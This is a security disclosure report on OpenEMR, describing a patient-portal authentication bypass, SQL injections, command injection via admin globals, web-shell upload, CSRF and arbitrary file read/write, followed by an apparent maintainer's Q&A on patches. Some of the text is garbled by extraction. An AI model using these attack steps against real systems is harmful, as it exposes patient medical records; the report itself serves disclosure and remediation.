1.0 - Abstract

OpenEMR is the most popular open-source electronic medical record and medical practice

management solution. This report details the vulnerabilities our team uncovered in

OpenEMR. Some examples of vulnerabilities detailed below include a portal authentication

bypass, multiple instances of SQL injection, multiple instances of remote code execution,

unauthenticated information disclosure, unrestricted file upload, CSRFs including a CSRF to

RCE proof of concept, and unauthenticated administrative actions.

1.1 - Methodology

We set up our OpenEMR testing lab on a Debian LAMP server with the latest source code

downloaded from Github (​https://github.com/openemr/openemr​). The vulnerabilities

disclosed in this report were found by manually reviewing the source code and modifying

requests with Burp Suite Community Edition, no automated scanners or source code

analysis tools were used.

2.0 - Patient Portal Authentication Bypass

DISCOVERIES

An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to

the registration page and modifying the requested url to access the desired page. Some

examples of pages in the portal directory that are accessible after browsing to the

registration page include:

-

-

-

-

-

-

-

-

-

-

add_edit_event_user.php

find_appt_popup_user.php

get_allergies.php

get_amendments.php

get_lab_results.php

get_medications.php

get_patient_documents.php

get_problems.php

get_profile.php

portal_payment.php

- messaging/messages.php

- messaging/secure_chat.php

-

-

-

report/pat_ledger.php

report/portal_custom_report.php

report/portal_patient_report.php

Normally, access to these pages requires authentication as a patient. If a user were to visit

any of those pages unauthenticated, they would be redirected to the login page.

Severity: ​High

4

Walkthrough:

Figure 1: Patient Portal Registration Page

From the Patient Portal login page, navigate to the patient registration page, then modify

the URL to navigate to the page you would like to visit such as add_edit_event_user.php, a

page that would allow an unauthenticated user to book appointments in the OpenEMR

system.

Figure 2: /portal/add_edit_event_user.php

Impact:

The photo below demonstrates the severity of the vulnerability by performing the

authentication bypass to access get_profile.php which displayed a random customer profile

from a real target. All the information, minus the first name, have been redacted to protect

the identity of the patient.

Figure 3: [redacted]/openemr/portal/get_profile.php

Vulnerable Code:

//continue session
session_start();

//landing page definition -- where to go if something goes wrong
$landingpage = "index.php?site=".$_SESSION['site_id'];
//

// kick out if patient not authenticated
if (isset($_SESSION['pid']) && isset($_SESSION['patient_portal_onsite_two'])) {

$pid = $_SESSION['pid'];

} else {

session_destroy();
header('Location: '.$landingpage.'&w');
exit;

}

//

6

$ignoreAuth=true
require_once(dirname(__file__) . './../interface/globals.php');

; // ignore the standard authentication for a regular OpenEMR user

 ​Figure 4: verify_session.php - Lines 42-48

$_SESSION['patient_portal_onsite_two'] = true;
$_SESSION['authUser'] = 'portal-user';
$_SESSION['pid'] = true;

 ​Figure 5: account/register.php - Lines 16-19

Verify_session.php only checks whether “pid” & “patient_portal_onsite_two” are set.

Register.php shows us that these are actually being set upon visiting. This is highly

concerning, as this now allows an unauthenticated attacker to leverage a couple of the SQL

Injection vulnerabilities mentioned below, compromising all records in the database.

Cause:

The only times that this authentication bypass works, is if the variable “$ignoreAuth” is set

to true. Conflicts begin to arise when the traditional authentication mechanism is loaded

(auth.inc). In globals.php, we will notice that auth.inc only gets loaded if $ignoreAuth is set

to false. There are multiple instances in OpenEMR where $ignoreAuth is ​NOT​ set to false.

if (!$ignoreAuth) {

include_once("$srcdir/auth.inc");

}

 ​Figure 6: interface/globals.php - Lines 566-568

Something to also note, $ignoreAuth is set to true in the file verify_session.php, therefore,

every file that includes verify_session.php ignores authentication as well.

3.0 - Multiple instances of SQL Injection

SQL Injection is a exploitation technique that consists of inserting a SQL query through the

input data. A SQL Injection attack can be leveraged to view data from a target database or

leveraged to perform a variety of other things i.e. perform database functions. Below are

details about the 8 SQL injections we identified in OpenEMR.

7

​

3.1 - SQL Injection in find_appt_popup_user.php

SQL injection in find_appt_popup_user.php is caused by unsanitized user input from the

catid​ and ​providerid​ parameters.  Exploiting this vulnerability requires authentication to

Patient Portal; however, it can be exploited without authentication when combined with the

Patient Portal authentication bypass mentioned above.

Severity: ​High

Vulnerable Code:

'$input_catid'

if ($input_catid) {
    $srow = sqlQuery("SELECT pc_duration FROM OpenEMR_postcalendar_categories WHERE
pc_catid =
    if ($srow['pc_duration']) {
        $catslots = ceil($srow['pc_duration'] / $slotsecs);
    }
}

");

 ​Figure 1: find_appt_popup_user.php - Lines 105-110

$query = "SELECT pc_eventDate, pc_endDate, pc_startTime, pc_duration, " .
"pc_recurrtype, pc_recurrspec, pc_alldayevent, pc_catid, pc_prefcatid, pc_title " .
"FROM openemr_postcalendar_events " .
"WHERE pc_aid =
 AND " .
"((pc_endDate >= '$sdate' AND pc_eventDate < '$edate') OR " .
"(pc_endDate = '0000-00-00' AND pc_eventDate >= '$sdate' AND pc_eventDate <
'$edate'))";
$res = sqlStatement($query);

3.2 - SQL Injection in add_edit_event_user.php

SQL injection in add_edit_event_user.php is caused by unsanitized user input from the ​eid​,

userid​, and ​pid​ parameters.  Exploiting this vulnerability requires authentication to Patient

Portal; however, it can be exploited without authentication when combined with the Patient

Portal authentication bypass mentioned above.

Severity: ​High

Vulnerable Code:

if ($eid) {
    $selfacil = '';
    $facility = sqlQuery("SELECT pc_facility, pc_multiple, pc_aid, facility.name
                            FROM openemr_postcalendar_events

3.3 - SQL Injection in Anything_simple.php

Anything_simple.php does a decent job at preventing SQL injection by using placeholders in

SQL queries; however, the ​getProviderIdOfEncounter​ function in forms.inc does not utilize

the same prevention technique. Instead, user input from the ​encounter ​parameter is

directly placed into an SQL query when passed through the ​getProviderIdOfEncounter

function, leaving the web application vulnerable to SQL injection. Exploiting this

vulnerability requires authentication in the OpenEMR interface.

Severity: ​High

3.4 - SQL Injection in forms_admin.php

A SQL injection attack can occur in the vulnerable ​id​ parameter due to user input being

placed directly into the SQL query in the ​getRegistryEntry​ function from registry.inc.

Exploiting this vulnerability requires authentication in the OpenEMR interface.

Severity: ​High

Vulnerable Code:

if ($_GET['method'] == "enable") {
    updateRegistered($_GET['id'], "state=1");
} elseif ($_GET['method'] == "disable") {
    updateRegistered($_GET['id'], "state=0");

3.5 - SQL Injection in search_code.php

A SQL injection can take place when sending a POST request to search_code.php with a

payload in the vulnerable ​text​ parameter. The input from the ​text​ parameter is included

directly into an SQL query without any sanitization. Exploiting this vulnerability requires

authentication to the OpenEMR interface.

Severity: ​High

Vulnerable Code:

if (isset($_POST["mode"]) && $_POST["mode"] == "search" && $_POST["text"] != "") {
  // $sql = "SELECT * FROM codes WHERE (code_text LIKE '%" . $_POST["text"] .

3.9 - SQL Injection in de_identification_screen2.php

If an attacker with administrator access can modify the global variables in edit_globals.php,

they would be able to successfully inject SQL statements in de_identification_screen2.php.

The is caused by the global “temporary_files_dir” variable being directly included inside the

SQL query.

Severity: ​High

Vulnerable Code:

$query = "LOAD DATA INFILE '"​.$GLOBALS['temporary_files_dir'].​"/metadata_de_identification.txt' INTO TABLE
metadata_de_identification FIELDS TERMINATED BY ','  LINES TERMINATED BY '\n'";
$res = sqlStatement($query);

Figure 14: de_identification_screen2.php - Lines 111-112

3.10 - Remediation Recommendations

For PHP, it’s recommended to use parameterized queries to prevent SQL injection attacks

in each of the vulnerable code snippets described above.

4.0 - Unauthenticated Information Disclosure

Information disclosure occurs when an application does not adequately protect sensitive

information from parties that would not normally have access to said information.

Although information disclosure isn’t exploitable on its own it can allow an attacker to

gather information which can be utilized later in the attack cycle.

4.1 - admin.php

There are several instances of unauthenticated information disclosure in OpenEMR. The

first one we discovered lies at admin.php. Upon visiting

http://host/<OpenEMR_directory>/admin.php an unauthenticated user will be prompted

with the database name, the site ID as well as the current version of OpenEMR.

Figure 1: admin.php

Severity: ​Low

4.2 - sql_patch.php

Another instance of unauthenticated information disclosure lies at sql_patch.php. Upon

visiting the page it is possible to learn the version information of the installation. This is also

an example of an unauthenticated administrative action as navigating to the page would

trigger a database patch.

15

Figure 2: sql_patch.php

Severity: ​Low

4.3 - setup.php

There is yet another instance of information disclosure in the /gacl directory. This occurs if

the system administrator forgets to remove the setup.php file after the original installation.

Upon accessing https://host/openemr/setup.php, it will greet you the current database

driver, host, user, database and table prefix.

Severity: ​Low

Figure 3: /gacl/setup.php

16

5.0 - Unrestricted File Upload

Open EMR is vulnerable to an unrestricted file upload vulnerability in

super/manage_site_files.php. This is due to improper (non-existent), checks on the file

submitted by the administrator. An authenticated user could use this vulnerability to

escalate their privileges by uploaded a PHP web shell to execute system commands.

Severity: ​Medium

Vulnerable Code:

    if (is_uploaded_file($_FILES['form_image']['tmp_name']) &&
$_FILES['form_image']['size']) {
        $form_dest_filename = $_POST['form_dest_filename'];
        if ($form_dest_filename == '') {
            $form_dest_filename = $_FILES['form_image']['name'];
        }

        $form_dest_filename = basename($form_dest_filename);
        if ($form_dest_filename == '') {
            die(htmlspecialchars(xl('Cannot find a destination filename')));
        }

        $imagepath = "$imagedir/$form_dest_filename";
        // If the site's image directory does not yet exist, create it.
        if (!is_dir($imagedir)) {
            mkdir($imagedir);
        }

        if (is_file($imagepath)) {
            unlink($imagepath);
        }

        $tmp_name = $_FILES['form_image']['tmp_name'];
        if (!move_uploaded_file($_FILES['form_image']['tmp_name'], $imagepath)) {
            die(htmlspecialchars(xl('Unable to create') . " '$imagepath'"));
        }
    }

Figure 1: manage_site_files.php - Lines 62-87

Remediation Recommendations:

Since the uploading function above is meant for uploading images, it’s important to take

steps to ensure the file being uploaded is actually an image. This can be done by

blacklisting malicious extensions, checking the MIME type of file, or utilizing the

getimagesize() function to check whether the file is an image.

6.0 - Remote Code Execution

Remote Code Execution happens when a user gains control of a value improperly sanitized

by the server. An authenticated attacker could use these vulnerabilities to escalate their

privileges on the server.

6.1 - RCE in sl_eob_search.php

A remote code execution vulnerability lies in OpenEMR’s sl_eob_search.php file.

Severity: ​High

Vulnerable Code:

$STMT_PRINT_CMD = $GLOBALS['print_command'];

Figure 1: statement.inc.php - Line 30

 $STMT_TEMP_FILE");

exec("$STMT_PRINT_CMD
if ($_POST['form_without']) {

not be updated.');
} else {
$alertmsg = xl('Now printing') .' '. $stmt_count .' '. xl('statements and updating
invoices.');
}

Figure 2: sl_eob_search.php - Lines 565-570

In order to successfully exploit this vulnerability, an authenticated user must gain control of

the print_command global variable. The edit_globals.php file makes this very easy for us.

Step 2​: ​Send POST request to sl_eob_search.php asking to print the form. This is how Figure

2 gets called.

6.2 - RCE in fax_dispatch.php

Severity: ​High

An attacker can execute system commands by inserting them into the ​hylafax_enscript

variable in edit_globals.php.

http://host/openemr/interface/super/edit_globals.php

Vulnerable Code:

$tmp0 = exec("cd $webserver_root/custom; "

. $GLOBALS['hylafax_enscript'] .

" -o $tmpfn2 $tmpfn1", $tmp1, $tmp2);

Figure 3: fax_dispatch.php - Lines 315-316

​

6.3 - RCE in faxq.php

System commands can be executed if an attacker with administrative access were to insert

commands into the ​hylafax_server ​variable in edit_globals.php.

Severity: ​High

Vulnerable Code:

if ($GLOBALS['enable_hylafax']) {
// Get the recvq entries, parse and sort by filename.
    $statlines = array();

exec("faxstat -r -l -h " . $GLOBALS['hylafax_server']

, $statlines);

Figure 4: faxq.php - Lines 29-32

6.4 - RCE in daemon_frame.php

An attacker with administrative privileges can execute system commands by visiting

daemon_frame.php after they were inserted into the ​hylafax_server​ variable in

edit_globals.php.

Severity: ​High

Vulnerable Code:

if ($GLOBALS['enable_hylafax']) {
    $statlines = array();

exec("faxstat -r -l -h " . $GLOBALS['hylafax_server']

, $statlines);

Figure 5: daemon_frame.php - Lines 25-27

6.7 - Remediation Recommendations

All of these RCE vulnerabilities exist due to the fact that none of the global variables are

being sanitized when being passed to a shell command. This can be avoided by using the

following PHP functions, combined with safe programming practices:

● escapeshellcmd()

● escapeshellarg()

OpenEMR is vulnerable to more than several cross-site request forgery vulnerabilities. The

most impactful one is in super/manage_site_files.php, which we coincidentally covered

above in our unrestricted file upload section. Obviously, if a malicious user were to

convince an administrator to click a certain link, that malicious user could successfully pop

a shell on their target.

Nearly all of OpenEMR’s administrative actions are vulnerable to CSRF one way or another.

Not directly, but through the library/ajax and also the interface/super directory. Here is a

list of vulnerable files:

7.1 - CSRF to RCE Chain

If a malicious user were to convince an OpenEMR administrator to open a specific link, they

could successfully escalate this to remote code execution via uploading a web-shell through

super/manage_site_files.php. By exploiting an unprotected file upload vulnerability, an

unauthenticated attacker could use this to escalate privileges and spawn a shell on the box.

Proof of Concept Code:

Severity: ​High

8.0 - Unauthenticated Administrative Actions

There are a wide variety of administrative actions an unauthenticated user can perform just

by knowing the relative URL path. One of our findings was that an unauthenticated user

can run an IPPF upgrade on a remote server by visiting http://host/<OpenEMR_directory>

/ippf_upgrade.php. Upon visiting ippf_upgrade.php a user is prompted with a button that

when pressed would begin to convert the databases to UTF8 (provided they aren’t encoded

already).

24

Figure 1: ippf_upgrade.php

In addition to being able to convert the databases an unauthenticated user can perform a

version upgrade remotely by visiting http://host/<OpenEMR_directory>/sql_upgrade.php

and clicking upgrade database.

Figure 2: sql_upgrade.php

Severity: ​Low

9.0 - Arbitrary File Actions in import_template.php

User input from several POST parameters defined in import_template.php is passed

through functions without any sanitization allowing an attacker authenticated as a patient

to upload, modify, retrieve, or delete files on the system.

9.1 - Arbitrary File Write

An attacker authenticated in the patient portal can make a crafted request to upload any

type of file, including php, to the system. This could later be used by the attacker to achieve

code execution and escalate privileges.

Severity: ​High

Vulnerable Code:

} else if ($_POST['mode'] == 'save') {

file_put_contents($_POST['docid'], $_POST['content']);
exit(true);

}

9.2 - Arbitrary File Read

There is no sanitization, before the user input from ​docid​  is passed to the

file_get_contents() function, allowing an attacker to view files on the system outside the

web directory, including /etc/passwd

### [Popular healthcare software OpenEMR contained multiple security flaws](https://www.teiss.co.uk/threats/openemr-security-flaws/)

As many as 30 security vulnerabilities were discovered by security researchers in OpenEMR, the most popular open-source electronic medical record and medical practice management solution in the world.

### [Health data 'put at risk by security bugs'](https://www.bbc.co.uk/news/technology-45083778)

Almost 100 million patients were affected worldwide, according to security researchers.

Here are some questions that journalists have asked us along with our replies:

**Any comment from OpenEMR about the vulnerabilities?**

The OpenEMR community is very thankful to Project Insecurity for their report, which led to an improvement in OpenEMR’s security. Responsible security vulnerability reporting is an invaluable asset for OpenEMR and all open source projects. The OpenEMR community takes security seriously and considered this vulnerability report high priority since one of the reported vulnerabilities did not require authentication. A patch was promptly released and announced to the community. Additionally, all downstream packages and cloud offerings were patched.

**Have all the problems cited in report indeed been patched?**

The key vulnerability in this report is the Patient Portal Authentication Bypass, which essentially allows a bad actor to bypass authentication and gain access to OpenEMR (if the patient portal is turned on). All the other vulnerabilities require authentication.

The Patient Portal Authentication Bypass, Multiple instances of SQL Injection, Unrestricted File Upload, Remote Code Execution, and Arbitrary File Actions vulnerabilities were all fixed.

The Unauthenticated Information Disclosure and Unauthenticated Administrative Actions involve files that are removed after installation, so there was no fix needed.

The CSRF was not fixed and OpenEMR is working on a mechanism, which will require substantial code changes, to prevent this in the next OpenEMR version.

**What should healthcare entities who use OpenEMR need to do to address the issues? Any suggestions for those organizations?**

They just need to install most recent patch at <https://www.open-emr.org/wiki/index.php/OpenEMR_Patches> . New patches and security fixes are announced to the registration list in addition to OpenEMR’s online forum and social accounts (such as twitter, facebook, etc.). There is an online community at [open-emr.org](http://open-emr.org) that can provide free support in addition to a group of vendors that can provide professional support.

**I understand that OpenEMR is used to manage between 90 million and 110 million patient records worldwide. Is that figure accurate? What countries are the biggest users of OpenEMR?**

That figure is only an estimate and taken from this article in 2012: <http://www.openhealthnews.com/hotnews/openemr-continues-grow-popularity-and-use>

OpenEMR is an open source software project and does not require registration. There is an optional registration which only collects email addresses, so the location of these OpenEMR users is not known.

Hopefully the above information helps to inform the community.

**Conclusion and plan moving forward:**

I’m planning to focus more on OpenEMR’s security. We are working on a CSRF mechanism now and are going through OpenEMR’s codebase to remove all lingering sql-injection and XSS vulnerabilities. See here for ongoing updates in plan:

If anybody is interested in helping with this effort, just let me know.

Thanks,
